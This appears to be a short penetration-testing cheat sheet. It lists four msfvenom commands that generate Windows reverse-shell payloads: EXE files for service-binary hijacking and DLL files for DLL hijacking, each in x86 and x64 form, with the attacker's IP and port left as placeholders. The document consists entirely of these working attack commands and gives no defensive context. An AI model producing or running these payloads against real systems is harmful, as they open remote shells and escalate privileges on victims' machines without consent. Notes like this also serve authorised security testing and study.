# Instruction
---
Create Binary for binary service hijacking.
x86: `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > $filename.exe`
x64: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > $filename.exe`

Create DLL for DLL hijacking.
x86: `msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll > $filename.dll`
x64: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll > $filename.dll`